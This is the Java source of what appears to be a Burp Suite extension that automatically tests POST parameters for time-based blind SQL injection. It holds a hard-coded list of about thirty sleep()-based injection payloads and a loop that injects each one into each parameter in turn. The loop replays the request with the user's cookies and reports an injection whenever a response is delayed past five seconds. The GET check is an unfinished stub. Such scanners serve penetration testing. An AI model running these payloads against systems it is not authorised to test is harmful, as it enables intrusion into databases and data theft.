package sqlinject;

import java.util.List;

import org.apache.http.Header;
import org.apache.http.NameValuePair;
import org.omg.CORBA.PUBLIC_MEMBER;

import bsmali4.Bsmali4Post;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;

public class SQLINJECT1103 {
	static List<String> payloads;
	static String cookies;
	static final int TIMEOUT = 5000;

	// 初始化payloads
	public static List<String> initpayload(boolean refresh) {
		if (refresh) {
			payloads = null;
		}
		if (payloads != null)
			return payloads;
		else {
			payloads = new ArrayList<String>();
			// payloads.add("' xor sleep()#");
			int timeout = 5;
			// payloads.add("' and sleep(" + timeout + ")#");
			payloads.add("' xor sleep(" + timeout + ")#");
			payloads.add("' or sleep(" + timeout + ")");
			payloads.add("' and sleep(" + timeout + ")#");
			payloads.add("' xor sleep(" + timeout + ")#");
			payloads.add("' or sleep(" + timeout + ")#");
			payloads.add("' and sleep(" + timeout + ")--");
			payloads.add("' xor sleep(" + timeout + ")--");
			payloads.add("' or sleep(" + timeout + ")--");
			payloads.add("') and sleep(" + timeout + ") or ('a'='a");
			payloads.add("') xor sleep(" + timeout + ") or ('a'='a");
			payloads.add("') and sleep(" + timeout + ") or ('a'='a");
			payloads.add("^sleep(" + timeout + ")^'");
			payloads.add("'^sleep(" + timeout + ")^'");
			payloads.add("^sleep(" + timeout + ")#");
			payloads.add("'^sleep(" + timeout + ")#");
			payloads.add("'^sleep(" + timeout + ")--");
			payloads.add("^sleep(" + timeout + ")--");
			payloads.add("' or sleep(" + timeout + ") or '1'='1'--");
			payloads.add("' and sleep(" + timeout + ") or '1'='1'--");
			payloads.add("' xor sleep(" + timeout + ") or '1'='1'--");
			payloads.add("' or sleep(" + timeout + ") or ''='");
			payloads.add("\" or sleep(" + timeout + ") or \"\"=\"");
			payloads.add("\" sleep(" + timeout + ") or \"a\"=\"a");
			payloads.add("\" and sleep(" + timeout + ") or 1=1 --");
			payloads.add("' and sleep(" + timeout + ") or 1=1 --");
			payloads.add("' and sleep(" + timeout + ") or 'a'='a");
			payloads.add("') or sleep(" + timeout + ") or ('a'='a");
			payloads.add("\") or sleep(" + timeout + ") or (\"a\"=\"a");
			payloads.add("'admin' or sleep(" + timeout + ") or 'x'='x';");
			return payloads;
		}
	}

	public static void checkPostSqlinject(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		/* 初始化payload */
		initpayload(false);
		/* 构造，并且发送payload */
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		List<HttpParameter> Httpparameter = new ArrayList<HttpParameter>();// 参数list
		URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		stdout.println("coded by bsmali4");
		for (String header : headerStrings) {
			if (header.contains(":")) {
				String[] headerArrayStrings = header.split(":");
				if (headerArrayStrings[0].trim().equals("Cookie")) {
					cookies = headerArrayStrings[1];
				}
			}
		}
		// 获取参数
		for (IParameter parameter : parameters) {
			if (!cookies.contains(parameter.getName())) {
				Httpparameter.add(new HttpParameter(parameter.getName(),
						parameter.getValue()));
			}
		}

		for (String payload : payloads) {
			for (int i = 0; i < Httpparameter.size(); i++) {
				final Bsmali4Post httpPost = new Bsmali4Post(url.toString());
				// HEADER
				for (String header : headerStrings) {
					if (header.contains(":")) {
						String[] headerArrayStrings = header.split(":");
						if (headerArrayStrings[0].trim().equals("User-Agent")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim()
								.equals("Accept")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim().equals(
								"Accept-Language")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim().equals(
								"Accept-Encoding")) {
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						} else if (headerArrayStrings[0].trim()
								.equals("Cookie")) {
							cookies = headerArrayStrings[1];
							httpPost.addHeader(headerArrayStrings[0],
									headerArrayStrings[1]);
						}
					}
				}
				for (int j = 0; j < Httpparameter.size(); j++) {
					if (i == j) {
						httpPost.addData(Httpparameter.get(j).getKey(),
								Httpparameter.get(j).getValue() + payload);
					} else {
						httpPost.addData(Httpparameter.get(j).getKey(),
								Httpparameter.get(j).getValue());
					}
				}
				long startTime = System.currentTimeMillis();
				// stdout.println("====start=====");
				Thread t1 = new Thread() {
					public void run() {
						httpPost.doPost();
					};
				};
				t1.start();
				try {
					t1.join();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				long endTime = System.currentTimeMillis();
				if ((endTime - startTime) > TIMEOUT) {
					stdout.println("===========================================");
					stdout.println("=========this**found**a**sqlinject=========");
					for (String header : headerStrings) {
						stdout.println(header);
					}
					for (NameValuePair parameter : httpPost.getPostparams()) {
						stdout.println(parameter.getName() + ":"
								+ parameter.getValue());
					}
					stdout.println("===========================================");
					stdout.println();
					// stdout.println(httpPost.getResContent());
				}
			}
		}

	}

	public static void checkGetSqlinject(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		/* 初始化payload */
		initpayload(false);
		/* 构造，并且发送payload */
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		/* 发送get包 */

	}
}
